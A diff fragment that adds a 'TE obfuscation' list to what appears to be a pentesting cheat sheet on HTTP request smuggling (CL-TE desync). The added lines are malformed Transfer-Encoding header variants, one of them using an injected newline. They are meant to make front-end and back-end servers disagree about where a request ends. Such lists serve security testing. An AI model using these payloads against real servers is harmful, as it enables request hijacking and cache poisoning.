@@ -42,6 +42,18 @@ Transfer-Encoding: chunked
 Transfer-encoding: error
 ```
 
+TE obfuscation
+```
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+```
 
 
 #### HOW DESYNC CL-TE TO DETECT CL-TE + POC
